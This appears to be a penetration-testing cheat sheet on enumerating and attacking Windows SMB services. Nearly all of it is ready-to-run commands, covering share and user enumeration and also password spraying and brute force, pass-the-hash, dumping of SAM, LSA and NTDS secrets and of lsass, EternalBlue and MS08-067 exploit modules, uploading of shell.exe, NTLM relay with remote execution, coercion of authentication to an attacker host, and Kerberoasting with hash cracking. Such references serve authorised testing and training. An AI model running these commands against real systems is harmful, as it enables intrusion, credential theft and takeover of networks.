# SMB ENUMERATION (Port 445/139)

## PORT OVERVIEW
```
Port 139 - SMB over NetBIOS (legacy)
Port 445 - SMB over TCP (modern, direct hosting)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p445,139 <IP>                         # Service/Version detection
nmap -p445 --script smb-protocols <IP>          # SMB protocol versions
nmap -p445 --script smb-os-discovery <IP>       # OS discovery via SMB
nmap -p445 --script smb2-capabilities <IP>      # SMB2/3 capabilities
smbclient -L //<IP> -N                          # List shares (null session)
crackmapexec smb <IP>                           # Quick SMB info
```

## NMAP SMB ENUMERATION SCRIPTS
```bash
nmap --script "smb-*" -p445 <IP>                # All SMB scripts
nmap --script smb-protocols -p445 <IP>          # SMB versions (1, 2, 2.1, 3.0, 3.02, 3.11)
nmap --script smb-security-mode -p445 <IP>      # Message signing, user-level auth
nmap --script smb2-security-mode -p445 <IP>     # SMB2/3 security mode
nmap --script smb-os-discovery -p445 <IP>       # OS, domain, hostname, workgroup
nmap --script smb-enum-shares -p445 <IP>        # Enumerate shares
nmap --script smb-enum-users -p445 <IP>         # Enumerate users
nmap --script smb-enum-domains -p445 <IP>       # Enumerate domains
nmap --script smb-enum-groups -p445 <IP>        # Enumerate groups
nmap --script smb-enum-sessions -p445 <IP>      # Enumerate sessions
nmap --script smb-server-stats -p445 <IP>       # Server statistics
nmap --script smb-system-info -p445 <IP>        # System information
nmap --script smb-vuln* -p445 <IP>              # All SMB vulnerabilities
```

## SMBCLIENT (MANUAL CONNECTION)
```bash
# List shares
smbclient -L //<IP>                             # List shares (prompt for password)
smbclient -L //<IP> -N                          # Null session (no auth)
smbclient -L //<IP> -U ""                       # Empty username
smbclient -L //<IP> -U "guest"                  # Guest account
smbclient -L //<IP> -U "DOMAIN\user%password"   # Authenticated

# Connect to share
smbclient //<IP>/share                          # Connect with prompt
smbclient //<IP>/share -N                       # Null session
smbclient //<IP>/share -U "user%password"       # With credentials
smbclient //<IP>/C$ -U "administrator%password" # Admin share

# Connect with IP instead of DNS
smbclient -L -I <IP> //<IP>                     # Force IP resolution

# Common commands after connection
ls                                              # List files
cd <dir>                                        # Change directory
get <file>                                      # Download file
mget *                                          # Download all files
put <file>                                      # Upload file
mput *                                          # Upload all files
pwd                                             # Print working directory
```

## SMBMAP (ENUMERATE & INTERACT)
```bash
# Basic enumeration
smbmap -H <IP>                                  # Anonymous access
smbmap -H <IP> -u "" -p ""                      # Explicit null session
smbmap -H <IP> -u "guest" -p ""                 # Guest account
smbmap -H <IP> -u "user" -p "password"          # Authenticated
smbmap -H <IP> -u "user" -p "password" -d "DOMAIN"  # Domain authentication

# List shares
smbmap -H <IP> -L                               # List all shares

# Check permissions
smbmap -H <IP> -u "user" -p "password" | grep "WRITE"  # Find writable shares
smbmap -H <IP> -u "user" -p "password" | grep "READ"   # Find readable shares

# Download/Upload
smbmap -H <IP> -u "user" -p "password" --download 'Share\file.txt'
smbmap -H <IP> -u "user" -p "password" --upload 'local.txt' 'Share\remote.txt'

# Recursive file listing
smbmap -H <IP> -u "user" -p "password" -R       # Recursive directory listing

# Execute commands (if write access)
smbmap -H <IP> -u "user" -p "password" -x 'whoami'  # Execute command

# Scan subnet
smbmap -H 10.0.0.0/24 -u "" -p "" -L            # Scan entire subnet
```

## ENUM4LINUX (COMPREHENSIVE ENUMERATION)
```bash
# Full enumeration
enum4linux -a <IP>                              # All enumeration
enum4linux -a -u "user" -p "password" <IP>      # Authenticated enumeration

# Specific enumeration
enum4linux -U <IP>                              # User enumeration
enum4linux -S <IP>                              # Share enumeration
enum4linux -G <IP>                              # Group enumeration
enum4linux -P <IP>                              # Password policy
enum4linux -o <IP>                              # OS information
enum4linux -i <IP>                              # Printer information

# RID cycling
enum4linux -r <IP>                              # RID cycling (enumerate users via RID)
enum4linux -R 500-550 <IP>                      # RID range 500-550
```

## CRACKMAPEXEC (MULTI-PURPOSE SMB TOOL)
```bash
# Basic enumeration
crackmapexec smb <IP>                           # Quick SMB info
crackmapexec smb <IP> -u "" -p ""               # Null session
crackmapexec smb <IP> -u "guest" -p ""          # Guest account
crackmapexec smb <IP> -u "user" -p "password"   # Authenticated
crackmapexec smb <IP> -u users.txt -p passwords.txt  # Password spray

# Share enumeration
crackmapexec smb <IP> -u "user" -p "password" --shares  # List shares

# User enumeration (RID cycling)
crackmapexec smb <IP> -u "user" -p "password" --rid-brute  # RID bruteforce
crackmapexec smb <IP> -u "user" -p "password" --users  # Enumerate users

# Group enumeration
crackmapexec smb <IP> -u "user" -p "password" --groups  # List groups
crackmapexec smb <IP> -u "user" -p "password" --local-groups  # Local groups

# Password policy
crackmapexec smb <IP> -u "user" -p "password" --pass-pol  # Password policy

# Logged on users
crackmapexec smb <IP> -u "user" -p "password" --loggedon-users  # Currently logged on

# Command execution
crackmapexec smb <IP> -u "user" -p "password" -x "whoami"  # Execute command
crackmapexec smb <IP> -u "user" -p "password" -X '$PSVersionTable'  # PowerShell command

# Dump SAM/LSA
crackmapexec smb <IP> -u "administrator" -p "password" --sam  # Dump SAM hashes
crackmapexec smb <IP> -u "administrator" -p "password" --lsa  # Dump LSA secrets
crackmapexec smb <IP> -u "administrator" -p "password" --ntds  # Dump NTDS.dit (DC)

# Module execution
crackmapexec smb <IP> -u "user" -p "password" -M spider_plus  # Spider shares
crackmapexec smb <IP> -u "user" -p "password" -M mimikatz     # Run Mimikatz
crackmapexec smb <IP> -u "user" -p "password" -M lsassy       # Dump lsass
```

## NETEXEC (CRACKMAPEXEC FORK)
```bash
# Similar to CrackMapExec but actively maintained
netexec smb <IP>                                # Basic info
netexec smb <IP> -u "user" -p "password" --shares
netexec smb <IP> -u "user" -p "password" --rid-brute
netexec smb <IP> -u "administrator" -p "password" --sam
netexec smb <IP> -u "administrator" -p "password" -M rdp -o ACTION=enable  # Enable RDP
```

## RPCCLIENT (RPC ENUMERATION)
```bash
# Connect to RPC
rpcclient -U "" <IP>                            # Null session
rpcclient -U "user%password" <IP>               # Authenticated

# Common commands after connection
srvinfo                                         # Server information
enumdomains                                     # Enumerate domains
querydominfo                                    # Domain information
enumdomusers                                    # Enumerate domain users
enumdomgroups                                   # Enumerate domain groups
queryuser <RID>                                 # Query user by RID
querygroup <RID>                                # Query group by RID
getdompwinfo                                    # Password policy
querydispinfo                                   # Display info
lsaquery                                        # LSA query
lsaenumsid                                      # Enumerate SIDs
lookupsids <SID>                                # Lookup SID
lookupnames <username>                          # Lookup username
createdomuser <username>                        # Create user (if permissions)
```

## NULL SESSION TESTING
```bash
# Test for null session
smbclient -L //<IP> -N                          # SMBclient null session
rpcclient -U "" -N <IP>                         # RPCclient null session
enum4linux -a <IP>                              # Enum4linux (tries null session)
crackmapexec smb <IP> -u "" -p ""               # CME null session
smbmap -H <IP> -u "" -p ""                      # SMBmap null session

# If null session works, enumerate:
rpcclient -U "" -N <IP> -c "enumdomusers"       # List users
rpcclient -U "" -N <IP> -c "enumdomgroups"      # List groups
rpcclient -U "" -N <IP> -c "querydispinfo"      # Display info
```

## SMB SHARE ENUMERATION
```bash
# List shares (multiple methods)
smbclient -L //<IP> -N                          # SMBclient
smbmap -H <IP>                                  # SMBmap
crackmapexec smb <IP> --shares                  # CrackMapExec
nmap --script smb-enum-shares -p445 <IP>        # Nmap

# Common administrative shares (Windows)
C$                                              # C: drive (admin only)
ADMIN$                                          # Windows directory (admin only)
IPC$                                            # Inter-Process Communication (null session possible)
SYSVOL                                          # Domain policy/scripts (domain controllers)
NETLOGON                                        # Logon scripts (domain controllers)

# Test share access
smbclient //<IP>/C$ -U "administrator%password"
smbclient //<IP>/ADMIN$ -U "administrator%password"
smbclient //<IP>/SYSVOL -N                      # Often readable anonymously
```

## DOWNLOAD/UPLOAD FILES
```bash
# Download with smbclient
smbclient //<IP>/share -U "user%password"
> get file.txt                                  # Download single file
> mget *                                        # Download all files
> recurse ON                                    # Enable recursive
> prompt OFF                                    # Disable prompts
> mget *                                        # Recursive download

# Download with smbget
smbget -R smb://<IP>/share -U "user%password"   # Recursive download

# Upload with smbclient
smbclient //<IP>/share -U "user%password"
> put shell.exe                                 # Upload file
> mput *.exe                                    # Upload multiple files

# Upload with smbmap
smbmap -H <IP> -u "user" -p "password" --upload 'shell.exe' 'Share\shell.exe'

# Mount SMB share
mount -t cifs //<IP>/share /mnt/smb -o username=user,password=password
mount -t cifs //<IP>/share /mnt/smb -o username=user,password=password,vers=2.0
```

## PASSWORD ATTACKS
```bash
# Brute force / Password spray
crackmapexec smb <IP> -u users.txt -p passwords.txt  # Password spray
crackmapexec smb <IP> -u "user" -p passwords.txt     # Single user brute
crackmapexec smb <IP> -u users.txt -p "Password123!"  # Single password spray
crackmapexec smb <IP> -u users.txt -p passwords.txt --continue-on-success  # Don't stop after first success

# Hydra
hydra -L users.txt -P passwords.txt smb://<IP>  # Brute force
hydra -l administrator -P rockyou.txt smb://<IP>  # Single user

# Medusa
medusa -h <IP> -U users.txt -P passwords.txt -M smbnt

# Common default credentials
administrator:password, administrator:admin, admin:admin
administrator:Password1, administrator:P@ssw0rd
guest:, guest:guest
```

## PASS-THE-HASH
```bash
# Use NTLM hash instead of password
crackmapexec smb <IP> -u "administrator" -H "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
smbclient //<IP>/C$ -U "administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" --pw-nt-hash
pth-winexe -U "administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" //<IP> cmd
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@<IP>
```

## VULNERABILITY SCANNING
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p445 <IP>      # Check for EternalBlue
crackmapexec smb <IP> -u "" -p "" -M ms17-010   # CME module
msf> use exploit/windows/smb/ms17_010_eternalblue  # Metasploit exploit

# Other SMB vulnerabilities
nmap --script smb-vuln* -p445 <IP>              # All SMB vulns
nmap --script smb-vuln-ms08-067 -p445 <IP>      # MS08-067 (Conficker)
nmap --script smb-vuln-ms10-054 -p445 <IP>      # MS10-054
nmap --script smb-vuln-ms10-061 -p445 <IP>      # MS10-061
nmap --script smb-vuln-cve2009-3103 -p445 <IP>  # CVE-2009-3103
nmap --script smb-vuln-webexec -p445 <IP>       # WebExec vulnerability

# SMB signing check (relay attacks possible if disabled)
nmap --script smb-security-mode -p445 <IP>
crackmapexec smb <IP> --gen-relay-list relay.txt  # List targets without SMB signing
```

## IMPACKET TOOLS
```bash
# psexec.py (command execution)
impacket-psexec "user:password@<IP>"            # Get shell
impacket-psexec "DOMAIN/user:password@<IP>"     # Domain auth
impacket-psexec -hashes :<NTLM> user@<IP>       # Pass-the-hash

# smbexec.py (stealthier than psexec)
impacket-smbexec "user:password@<IP>"           # Get shell

# wmiexec.py (via WMI)
impacket-wmiexec "user:password@<IP>"           # Get shell via WMI

# secretsdump.py (dump credentials)
impacket-secretsdump "user:password@<IP>"       # Dump SAM, LSA, NTDS
impacket-secretsdump -just-dc "DOMAIN/user:password@<DC_IP>"  # NTDS.dit only
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL  # Offline extraction

# smbclient.py (Impacket version)
impacket-smbclient "user:password@<IP>"         # Interactive SMB client

# GetNPUsers.py (AS-REP Roasting)
impacket-GetNPUsers "DOMAIN/" -dc-ip <DC_IP> -usersfile users.txt  # AS-REP roasting

# GetUserSPNs.py (Kerberoasting)
impacket-GetUserSPNs "DOMAIN/user:password" -dc-ip <DC_IP> -request  # Kerberoasting

# lookupsid.py (RID cycling)
impacket-lookupsid "user:password@<IP>"         # Enumerate users via SID
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/smb/smb_version           # Version detection
use auxiliary/scanner/smb/smb_enumusers         # User enumeration
use auxiliary/scanner/smb/smb_enumshares        # Share enumeration
use auxiliary/scanner/smb/smb_login             # Login scanner
use exploit/windows/smb/ms17_010_eternalblue    # EternalBlue exploit
use exploit/windows/smb/ms08_067_netapi         # MS08-067 exploit
use exploit/windows/smb/psexec                  # PsExec exploit
use auxiliary/admin/smb/psexec_command          # Execute command
use auxiliary/admin/smb/upload_file             # Upload file
```

## RELAY ATTACKS
```bash
# Check for SMB signing (required for relay)
crackmapexec smb <IP> --gen-relay-list targets.txt  # Find targets without signing
nmap --script smb-security-mode -p445 <IP>      # Check signing status

# ntlmrelayx (Impacket)
impacket-ntlmrelayx -tf targets.txt -smb2support  # Relay to targets
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"  # Execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -e shell.exe  # Upload and execute

# Responder (capture hashes)
responder -I eth0 -wrf                          # Capture NTLM hashes
# Combine with ntlmrelayx for relay attacks
```

## INTERESTING FILES & DIRECTORIES
```bash
# Common interesting files in shares
Groups.xml                                      # Group Policy Preferences (passwords)
Registry.xml                                    # Registry settings
Services.xml                                    # Service configurations
*.kdbx                                          # KeePass databases
*.key, *.pem                                    # SSH/SSL keys
SAM, SYSTEM, SECURITY                           # Windows registry hives
NTDS.dit                                        # Active Directory database
web.config                                      # ASP.NET config (connection strings)
*.bat, *.ps1, *.vbs                             # Scripts (may contain credentials)
*.log                                           # Log files
*.txt, *.doc, *.xlsx                            # Documents (passwords?)

# Common locations
\\<IP>\SYSVOL\domain.com\Policies\              # Group Policy
\\<IP>\SYSVOL\domain.com\scripts\               # Logon scripts
\\<IP>\NETLOGON\                                # Logon scripts
\\<IP>\C$\inetpub\wwwroot\                      # IIS webroot
\\<IP>\C$\Windows\System32\config\              # Registry hives
```

## GROUP POLICY PREFERENCES (GPP) PASSWORDS
```bash
# Search for Groups.xml (contains encrypted passwords)
smbmap -H <IP> -u "user" -p "password" -R | grep -i "groups.xml"
smbclient //<IP>/SYSVOL -U "user%password"
> recurse ON
> prompt OFF
> mget Groups.xml

# Decrypt GPP password
gpp-decrypt "<encrypted_password>"              # Decrypt cpassword attribute

# Metasploit
use auxiliary/scanner/smb/smb_enum_gpp          # Find and decrypt GPP passwords
```

## SMB SHARES SPIDER (FIND SENSITIVE FILES)
```bash
# CrackMapExec spider module
crackmapexec smb <IP> -u "user" -p "password" -M spider_plus
crackmapexec smb <IP> -u "user" -p "password" -M spider_plus -o READ_ONLY=false  # Include writable

# Manual spider with smbmap
smbmap -H <IP> -u "user" -p "password" -R --depth 5 > smb_spider.txt

# Search for keywords
smbmap -H <IP> -u "user" -p "password" -R | grep -i "password\|backup\|config\|secret"
```

## KERBEROS ATTACKS (VIA SMB)
```bash
# AS-REP Roasting (users without Kerberos pre-auth)
impacket-GetNPUsers "DOMAIN/" -dc-ip <IP> -usersfile users.txt -format hashcat -outputfile hashes.txt

# Kerberoasting (request service tickets)
impacket-GetUserSPNs "DOMAIN/user:password" -dc-ip <IP> -request -outputfile kerberoast.txt

# Crack Kerberos tickets
hashcat -m 18200 hashes.txt rockyou.txt         # AS-REP roast
hashcat -m 13100 kerberoast.txt rockyou.txt     # Kerberoasting
```

## DOMAIN ENUMERATION (VIA SMB)
```bash
# Domain information
crackmapexec smb <IP> -u "user" -p "password" --users  # Domain users
crackmapexec smb <IP> -u "user" -p "password" --groups  # Domain groups
crackmapexec smb <IP> -u "user" -p "password" --pass-pol  # Password policy
rpcclient -U "user%password" <IP> -c "querydominfo"  # Domain info

# Find domain controllers
nmap -p389 --script ldap-rootdse <IP>           # LDAP query
crackmapexec smb <subnet> -u "user" -p "password" --pass-pol  # Identify DC

# Enumerate domain admins
net rpc group members "Domain Admins" -U "DOMAIN\user%password" -I <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ Null session enabled (IPC$ accessible anonymously)
☐ Guest account enabled
☐ SMB signing disabled (relay attacks possible)
☐ Anonymous share enumeration
☐ Writable shares (C$, ADMIN$, custom shares)
☐ Sensitive files in SYSVOL/NETLOGON (passwords, scripts)
☐ Group Policy Preferences with cpassword
☐ Weak passwords (password spray)
☐ SMBv1 enabled (EternalBlue vulnerability)
☐ MS17-010 unpatched (EternalBlue)
☐ MS08-067 unpatched
```

## QUICK WIN CHECKLIST
```
☐ Check for null session access
☐ Enumerate shares (readable/writable)
☐ Check for SMB signing disabled
☐ Test for MS17-010 (EternalBlue)
☐ Test for MS08-067
☐ Enumerate users (RID cycling, rpcclient)
☐ Password spray common passwords
☐ Search for Groups.xml (GPP passwords)
☐ Spider shares for sensitive files (password, backup, config)
☐ Check SYSVOL/NETLOGON for scripts
☐ Attempt to dump SAM/NTDS (if admin)
☐ AS-REP roasting (users without pre-auth)
☐ Kerberoasting (service accounts)
☐ Relay attacks (if signing disabled)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick SMB enumeration
nmap -sV -p445,139 --script smb-protocols,smb-security-mode,smb-enum-shares,smb-os-discovery <IP> && \
crackmapexec smb <IP> -u "" -p "" --shares && \
enum4linux -a <IP>

# Comprehensive with credentials
crackmapexec smb <IP> -u "user" -p "password" --shares --users --groups --pass-pol --rid-brute && \
smbmap -H <IP> -u "user" -p "password" -R
```

## ADVANCED TECHNIQUES
```bash
# Coerced authentication (PetitPotam, PrinterBug)
python3 PetitPotam.py <attacker_IP> <target_IP>  # Coerce auth to attacker
python3 printerbug.py DOMAIN/user:password@<target> <attacker_IP>  # Printer bug

# SMB relay to LDAP (privilege escalation)
impacket-ntlmrelayx -t ldap://<DC_IP> --escalate-user <user>

# SMB over QUIC (Windows 11/Server 2022+)
# Port 443 instead of 445

# SMB encryption bypass
# Test older SMB versions if encryption is enforced
```
